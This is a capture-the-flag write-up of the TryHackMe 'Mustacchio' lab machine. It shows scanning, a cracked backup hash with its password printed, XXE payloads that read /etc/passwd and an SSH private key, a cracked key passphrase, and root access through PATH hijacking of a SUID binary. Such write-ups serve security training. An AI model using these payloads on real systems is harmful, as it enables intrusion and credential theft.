## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Easy boot2root Machine
Make sure you're connected to [TryHackMe's network](https://tryhackme.com/access). If you don't know how to do this, complete the [OpenVPN room](https://tryhackme.com/room/openvpn) first.
```

## IP-Address
```IP-Address
10.49.166.41
```

## RustScan
```bash
$ rustscan -a 10.49.166.41  -b 450 -t 2000 --ulimit 5000 -- -e tun0  -p80
[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.49.166.41:22
Open 10.49.166.41:80
Open 10.49.166.41:8765
```

## Gobuster
```bash
$ gobuster dir -u http://10.49.166.41\/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-t 60 -x php,aspx,txt,html

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.166.41/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,aspx,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1752]
/images               (Status: 301) [Size: 313] [--> http://10.49.166.41/images/]
/contact.html         (Status: 200) [Size: 1450]
/about.html           (Status: 200) [Size: 3152]
/blog.html            (Status: 200) [Size: 3172]
/gallery.html         (Status: 200) [Size: 1950]
/custom               (Status: 301) [Size: 313] [--> http://10.49.166.41/custom/]
/robots.txt           (Status: 200) [Size: 28]
/fonts                (Status: 301) [Size: 312] [--> http://10.49.166.41/fonts/]
```

### /Custom Files
```bash
[PARENTDIR]	Parent Directory	 	-	 
[   ]	mobile.js	2021-06-12 15:48	1.4K	 
[   ]	users.bak	2021-06-12 15:48	8.0K	 
```

## Backupfile
```bash
─$ wget http://10.49.166.41/custom/js/users.bak
--2025-11-29 19:35:12--  http://10.49.166.41/custom/js/users.bak
Connecting to 10.49.166.41:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8192 (8.0K) [application/x-trash]
Saving to: ‘users.bak.1’

users.bak.1                  100%[==============================================>]   8.00K  --.-KB/s    in 0s      

2025-11-29 19:35:12 (271 MB/s) - ‘users.bak.1’ saved [8192/8192]
└─$ cat users.bak 
��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b     
```

Lets Examine the content of the file
```bash
admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```
That's the actual file backup file credentials format. and the encryption is SHA-1
which is decoded as 
```bash
admin:bulldog19
```

After that Surf for the port 8765
Which is actually a backend Login page where these credentials are actually going to use
and after login we checked the source code and find out an hidden Directory
```bash
/auth/dontforget.bak
```
then 
```bash
wget http://10.49.166.41:8765/auth/dontforget.bak
```
and content of the bak
```bash
┌──(kali㉿kali)-[~]
└─$ cat dontforget.bak 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>                                                                         
```

Which tells us about the C Comment of the XML Code and XXE Vulnerabliity
```bash
<?xml version="1.0"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <name>admin</name>
  <author>admin</author>
  <com>&xxe;</com>
</comment>
```

Use this in payload comment section and boom
```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false joe:x:1002:1002::/home/joe:/bin/bash barry:x:1003:1003::/home/barry:/bin/bash
```

And then 
```bash
<?xml version="1.0"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>admin</name>
  <author>admin</author>
  <com>&xxe;</com>
</comment>
```

And get the RSA Key
```bash
-----BEGIN RSA PRIVATE KEY-----
[private key omitted]
-----END RSA PRIVATE KEY-----
```

then 
```bash
$ssh2john id_rsa > has.txt
$john has.txt -w=/usr/share/wordlists/rockyou.txt 
urieljames       (id_rsa)     
$chmod 600 id_rsa                
$ssh -i id_rsa barry@10.49.170.71
The authenticity of host '10.49.170.71 (10.49.170.71)' can't be established.
ED25519 key fingerprint is SHA256:8ffSUaKVshwAGNYcOWTbXfy0ik5uNnUqe/0nXK/ybSA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
```

## User Flag
```Flag
barry@mustacchio:~$ ls
user.txt
barry@mustacchio:~$ cat user.txt 
[flag/hash omitted]
```

## Privilege Escalation
```bash
$find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

Suspecious SUID File are
```bash
/home/joe/live_log
```
This immediately looked suspicious because:
- A **SUID binary inside a user's home directory** is extremely unusual.
- It is owned by **root** and **setuid**, meaning it runs with root privileges.
```bash
$file /home/joe/live_log
setuid ELF 64-bit LSB shared object, not stripped
$strings ./live_log | grep -i log
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
system("tail -f /var/log/nginx/access.log");
$strings ./live_log | grep system
system
system@@GLIBC_2.2.5
```
then Use the Path Hijacking Vulnerability

```bash
barry@mustacchio:/home/joe$ strings ./live_log | grep -i logLive Nginx Log Reader
tail -f /var/log/nginx/access.log
barry@mustacchio:/home/joe$ strings ./live_log | grep system
system
system@@GLIBC_2.2.5
barry@mustacchio:/home/joe$ echo -e '#!/bin/bash\n/bin/bash -p' > /home/barry/tail
barry@mustacchio:/home/joe$ chmod +x /home/barry/tail
barry@mustacchio:/home/joe$ export PATH=/home/barry:$PATH
barry@mustacchio:/home/joe$ ./live_log
root@mustacchio:/home/joe#
```

## Root Flag
```Flag
root@mustacchio:~# cd /root
root@mustacchio:/root# ls
root.txt
root@mustacchio:/root# cat root.txt 
[flag/hash omitted]
```
# END
